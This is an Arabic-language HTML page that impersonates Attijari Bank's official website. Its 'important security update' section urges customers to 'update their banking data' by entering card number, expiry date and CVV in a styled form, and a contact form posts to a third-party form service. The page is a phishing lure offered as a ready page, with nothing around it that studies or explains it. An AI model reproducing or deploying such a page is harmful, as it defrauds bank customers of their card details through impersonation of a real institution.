<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>التجاري بنك - الموقع الرسمي</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet">
<script src="https://cdn.tailwindcss.com/3.4.16"></script>
<script>tailwind.config={theme:{extend:{colors:{primary:'#e94e3d',secondary:'#ffc107'},borderRadius:{'none':'0px','sm':'4px',DEFAULT:'8px','md':'12px','lg':'16px','xl':'20px','2xl':'24px','3xl':'32px','full':'9999px','button':'8px'}}}}</script>
<style>
:where([class^="ri-"])::before { content: "\f3c2"; }
@font-face {
font-family: 'DINNextLTArabic';
src: url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
}
.logo-bg {
background: linear-gradient(135deg, #e94e3d 0%, #ffc107 100%);
}
body {
font-family: 'DINNextLTArabic', 'Tajawal', sans-serif;
background-color: #f9f9f9;
}
.hero-section {
background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://readdy.ai/api/search-image?query=modern%20bank%20building%20at%20night%20with%20illuminated%20facade%2C%20corporate%20architecture%2C%20financial%20district%2C%20professional%20high%20quality%20photograph%2C%20no%20people&width=1200&height=600&seq=1&orientation=landscape');
background-size: cover;
background-position: center;
}
.bank-building {
background-image: url('https://readdy.ai/api/search-image?query=modern%20bank%20headquarters%20building%20during%20daytime%2C%20corporate%20architecture%2C%20financial%20district%2C%20professional%20high%20quality%20photograph%2C%20clear%20blue%20sky&width=800&height=400&seq=2&orientation=landscape');
background-size: cover;
background-position: center;
}
input:focus {
outline: none;
}
input[type="number"]::-webkit-inner-spin-button,
input[type="number"]::-webkit-outer-spin-button {
-webkit-appearance: none;
margin: 0;
}
</style>
</head>
<body class="min-h-screen">
<!-- Header -->
<header class="bg-white shadow-sm">
<div class="container mx-auto px-4 py-2 flex justify-between items-center">
<div class="flex items-center gap-3">
<div class="w-12 h-12 flex items-center justify-center logo-bg rounded">
<i class="ri-user-line text-white ri-lg"></i>
</div>
<div class="w-12 h-12 flex items-center justify-center border border-primary rounded">
<i class="ri-apps-line text-primary ri-lg"></i>
</div>
</div>
<div class="flex items-center">
<img src="https://static.readdy.ai/image/bac0af4a5bc5a095392383d9d19f531c/eb3dd60d9ed6c2fb6c36e4dd1cde8de0.png" alt="التجاري بنك" class="h-12">
</div>
</div>
<nav class="bg-black text-white">
<div class="container mx-auto px-4 py-3 flex justify-between items-center">
<button class="w-8 h-8 flex flex-col justify-center items-center gap-1">
<span class="w-6 h-0.5 bg-white"></span>
<span class="w-6 h-0.5 bg-white"></span>
<span class="w-6 h-0.5 bg-white"></span>
</button>
<h2 class="text-xl font-bold">اكتشف التجاري بنك</h2>
</div>
</nav>
</header>
<!-- Hero Section -->
<section class="hero-section relative min-h-[300px] flex items-center">
<div class="absolute top-0 left-0 bottom-0 w-16 logo-bg flex items-center justify-center">
<i class="ri-arrow-left-line text-white ri-lg"></i>
</div>
<div class="container mx-auto px-4 py-16 text-white">
<h3 class="text-lg mb-2">في الصفحة الرئيسية</h3>
<h1 class="text-3xl font-bold mb-8">التجاري بنك يطلق موقعه الإلكتروني الجديد</h1>
</div>
</section>
<!-- Bank Security Update Section -->
<section class="container mx-auto px-4 py-8">
<div class="bg-white rounded-lg shadow-lg p-6 mb-8">
<div class="flex items-center justify-between mb-4">
<h2 class="text-2xl font-bold text-gray-800">تحديث أمني مهم</h2>
<div class="w-10 h-10 flex items-center justify-center bg-primary rounded-full">
<i class="ri-shield-check-line text-white ri-lg"></i>
</div>
</div>
<p class="text-gray-700 mb-6">نحن بصدد إصدار نموذج أكثر أماناً لحسابات عملائنا الكرام. يرجى تحديث بياناتكم البنكية لضمان استمرارية الخدمات المصرفية بشكل آمن ومستقر.</p>
<div class="bg-gray-50 p-6 rounded-lg border border-gray-200">
<h3 class="text-xl font-bold text-gray-800 mb-4">تحديث البيانات البنكية</h3>
<form>
<div class="mb-4">
<label class="block text-gray-700 text-sm font-bold mb-2" for="cardNumber">
رقم البطاقة
</label>
<div class="relative">
<input type="text" id="cardNumber" class="w-full px-4 py-3 border border-gray-300 rounded text-gray-700 focus:border-primary" placeholder="0000 0000 0000 0000" dir="ltr">
<div class="absolute left-3 top-1/2 transform -translate-y-1/2 w-6 h-6 flex items-center justify-center">
<i class="ri-bank-card-line text-gray-400"></i>
</div>
</div>
</div>
<div class="flex gap-4 mb-4">
<div class="w-1/2">
<label class="block text-gray-700 text-sm font-bold mb-2" for="expDate">
تاريخ الانتهاء
</label>
<input type="text" id="expDate" class="w-full px-4 py-3 border border-gray-300 rounded text-gray-700 focus:border-primary" placeholder="MM/YY" dir="ltr">
</div>
<div class="w-1/2">
<label class="block text-gray-700 text-sm font-bold mb-2" for="cvv">
رمز الأمان CVV
</label>
<div class="relative">
<input type="text" id="cvv" class="w-full px-4 py-3 border border-gray-300 rounded text-gray-700 focus:border-primary" placeholder="123" dir="ltr">
<div class="absolute left-3 top-1/2 transform -translate-y-1/2 w-6 h-6 flex items-center justify-center">
<i class="ri-lock-line text-gray-400"></i>
</div>
</div>
</div>
</div>
<div class="bg-yellow-50 border-r-4 border-yellow-400 p-4 mb-6">
<div class="flex">
<div class="w-6 h-6 flex items-center justify-center ml-2">
<i class="ri-information-line text-yellow-500"></i>
</div>
<div>
<p class="text-sm text-yellow-700">نحن بصدد إصدار نموذج أكثر أماناً لحماية حساباتكم المصرفية. شكراً لتعاونكم.</p>
</div>
</div>
</div>
<button type="submit" class="w-full bg-primary hover:bg-primary/90 text-white font-bold py-3 px-4 rounded-button transition duration-300 whitespace-nowrap">
تحديث البيانات
</button>
</form>
</div>
</div>
<!-- Bank Building Image -->
<div class="rounded-lg overflow-hidden shadow-lg h-64 mb-8 bank-building"></div>
<!-- News Section -->
<div class="flex justify-between items-center mb-4">
<h3 class="text-xl font-bold text-primary">أخبار</h3>
<span class="text-gray-600">18.04.2025</span>
</div>
<div class="bg-white rounded-lg shadow p-6">
<h2 class="text-2xl font-bold mb-4 text-gray-800">إعلام بتوزيع أرباح السنة المحاسبية 2025</h2>
<p class="text-gray-700 mb-4">يعلن التجاري بنك عن توزيع الأرباح السنوية للمساهمين عن السنة المحاسبية 2025. سيتم إيداع الأرباح في حسابات المساهمين بداية من تاريخ 25 أبريل 2025.</p>
<button class="bg-primary hover:bg-primary/90 text-white font-bold py-2 px-4 rounded-button transition duration-300 whitespace-nowrap">
المزيد من التفاصيل
</button>
</div>
</section>
<!-- Contact Form Section -->
<section class="container mx-auto px-4 py-8">
<div class="bg-white rounded-lg shadow-lg p-6">
<div class="flex items-center justify-between mb-6">
<h2 class="text-2xl font-bold text-gray-800">تواصل معنا</h2>
<div class="w-10 h-10 flex items-center justify-center bg-primary rounded-full">
<i class="ri-mail-send-line text-white ri-lg"></i>
</div>
</div>
<form action="https://formspree.io/f/xanegoyq" method="POST" enctype="multipart/form-data" class="space-y-6">
<div>
<label class="block text-gray-700 text-sm font-bold mb-2" for="email">
البريد الإلكتروني
</label>
<div class="relative">
<input type="email" id="email" name="email" class="w-full px-4 py-3 border border-gray-300 rounded text-gray-700 focus:border-primary" placeholder="example@domain.com" dir="ltr">
<div class="absolute left-3 top-1/2 transform -translate-y-1/2 w-6 h-6 flex items-center justify-center">
<i class="ri-mail-line text-gray-400"></i>
</div>
</div>
</div>
<div>
<label class="block text-gray-700 text-sm font-bold mb-2" for="message">
الرسالة
</label>
<textarea id="message" name="message" rows="4" class="w-full px-4 py-3 border border-gray-300 rounded text-gray-700 focus:border-primary resize-none" placeholder="اكتب رسالتك هنا..." dir="rtl"></textarea>
</div>
<div>
<label class="block text-gray-700 text-sm font-bold mb-2" for="upload">
الملف المرفق
</label>
<div class="relative">
<input type="file" id="upload" name="upload" class="w-full px-4 py-3 border border-gray-300 rounded text-gray-700 focus:border-primary file:mr-4 file:py-2 file:px-4 file:rounded-button file:border-0 file:text-sm file:font-semibold file:bg-primary file:text-white hover:file:bg-primary/90" dir="ltr">
</div>
</div>
<button type="submit" class="w-full bg-primary hover:bg-primary/90 text-white font-bold py-3 px-4 rounded-button transition duration-300 whitespace-nowrap flex items-center justify-center gap-2">
<i class="ri-send-plane-line"></i>
إرسال
</button>
</form>
</div>
</section>
<!-- Footer -->
<footer class="bg-gray-900 text-white py-8 mt-8">
<div class="container mx-auto px-4">
<div class="flex flex-wrap justify-between">
<div class="w-full md:w-1/3 mb-6 md:mb-0">
<h3 class="text-xl font-bold mb-4">التجاري بنك</h3>
<p class="text-gray-400 mb-4">الشريك المالي الموثوق لكل احتياجاتك المصرفية</p>
<div class="flex space-x-4">
<div class="w-8 h-8 flex items-center justify-center bg-primary rounded-full">
<i class="ri-facebook-fill text-white"></i>
</div>
<div class="w-8 h-8 flex items-center justify-center bg-primary rounded-full">
<i class="ri-twitter-x-fill text-white"></i>
</div>
<div class="w-8 h-8 flex items-center justify-center bg-primary rounded-full">
<i class="ri-instagram-fill text-white"></i>
</div>
<div class="w-8 h-8 flex items-center justify-center bg-primary rounded-full">
<i class="ri-linkedin-fill text-white"></i>
</div>
</div>
</div>
<div class="w-full md:w-1/3 mb-6 md:mb-0">
<h3 class="text-xl font-bold mb-4">روابط سريعة</h3>
<ul class="space-y-2">
<li><a href="#" class="text-gray-400 hover:text-white transition">الخدمات المصرفية للأفراد</a></li>
<li><a href="#" class="text-gray-400 hover:text-white transition">الخدمات المصرفية للشركات</a></li>
<li><a href="#" class="text-gray-400 hover:text-white transition">الاستثمار والتمويل</a></li>
<li><a href="#" class="text-gray-400 hover:text-white transition">فروعنا</a></li>
</ul>
</div>
<div class="w-full md:w-1/3">
<h3 class="text-xl font-bold mb-4">اتصل بنا</h3>
<ul class="space-y-2">
<li class="flex items-center">
<div class="w-6 h-6 flex items-center justify-center ml-2">
<i class="ri-map-pin-line text-primary"></i>
</div>
<span class="text-gray-400">شارع الحبيب بورقيبة، تونس العاصمة</span>
</li>
<li class="flex items-center">
<div class="w-6 h-6 flex items-center justify-center ml-2">
<i class="ri-phone-line text-primary"></i>
</div>
<span class="text-gray-400">+216 71 123 456</span>
</li>
<li class="flex items-center">
<div class="w-6 h-6 flex items-center justify-center ml-2">
<i class="ri-mail-line text-primary"></i>
</div>
<span class="text-gray-400">info@attijaribank.com</span>
</li>
</ul>
</div>
</div>
<hr class="border-gray-800 my-6">
<div class="flex flex-wrap justify-between items-center">
<p class="text-gray-500 text-sm">© 2025 التجاري بنك. جميع الحقوق محفوظة.</p>
<div class="flex items-center space-x-4 mt-4 md:mt-0">
<div class="w-8 h-8 flex items-center justify-center">
<i class="ri-visa-line text-gray-400 ri-lg"></i>
</div>
<div class="w-8 h-8 flex items-center justify-center">
<i class="ri-mastercard-line text-gray-400 ri-lg"></i>
</div>
<div class="w-8 h-8 flex items-center justify-center">
<i class="ri-paypal-line text-gray-400 ri-lg"></i>
</div>
</div>
</div>
</div>
</footer>
<script>
document.addEventListener('DOMContentLoaded', function() {
const cardNumberInput = document.getElementById('cardNumber');
if (cardNumberInput) {
cardNumberInput.addEventListener('input', function(e) {
let value = e.target.value.replace(/\D/g, '');
if (value.length > 16) {
value = value.slice(0, 16);
}
// Format with spaces every 4 digits
const formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
e.target.value = formattedValue;
});
}
const expDateInput = document.getElementById('expDate');
if (expDateInput) {
expDateInput.addEventListener('input', function(e) {
let value = e.target.value.replace(/\D/g, '');
if (value.length > 4) {
value = value.slice(0, 4);
}
if (value.length > 2) {
value = value.slice(0, 2) + '/' + value.slice(2);
}
e.target.value = value;
});
}
const cvvInput = document.getElementById('cvv');
if (cvvInput) {
cvvInput.addEventListener('input', function(e) {
let value = e.target.value.replace(/\D/g, '');
if (value.length > 3) {
value = value.slice(0, 3);
}
e.target.value = value;
});
}
});
</script>
</body>
</html># Jassem555
